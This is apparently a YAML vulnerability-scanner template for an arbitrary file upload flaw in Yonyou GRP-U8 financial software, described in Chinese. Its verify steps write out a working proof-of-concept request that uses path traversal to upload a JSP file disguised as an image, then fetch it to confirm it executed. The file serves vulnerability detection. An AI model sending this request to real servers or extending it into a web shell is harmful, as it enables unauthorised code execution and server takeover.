app: 用友软件
query: app:"用友软件"
meta:
  name: 用友GRP-U8 U8AppProxy任意文件上传漏洞
  level: 4
  tags:
  - file_upload
  description: 用友GRP-U8R10行政事业财务管理软件是用友公司专注于电子政务事业，基于云计算技术所推出的新一代产品。用友 GRP-U8 U8AppProxy接口存在任意文件上传漏洞，攻击者通过漏洞可以获取服务器权限。
  homepage: ""
  author: X prism
  references: ""
  solution: 建议升级至安全版本
  create_at: "2024-07-13 01:11:33"
  available: false
  steps:
    variable: []
    verify_steps:
      type: and
      verify:
      - request:
          method: POST
          path: /U8AppProxy?gnid=myinfo&id=saveheader&zydm=../../yongyouU8_test
          redirect: true
          header:
          - Content-Type: multipart/form-data; boundary=5264a5a61f80c80713132b499e094266
          params: |-
            --5264a5a61f80c80713132b499e094266
            Content-Disposition: form-data; name="file"; filename="1.jsp"
            Content-Type: image/jpeg

            <% out.println("yongyouu8");%>
            --5264a5a61f80c80713132b499e094266--
        response:
        - name: code
          value: "500"
          type: equals
        - name: body
          value: Error report
          type: contains
      - request:
          method: GET
          path: /yongyouU8_test.jsp
          redirect: true
          header: []
          params: ""
        response:
        - name: code
          value: "200"
          type: equals
        - name: body
          value: yongyouu8
          type: contains
    exploit_steps:
      type: ""
      params:
        name: ""
        type: input
        value: ""
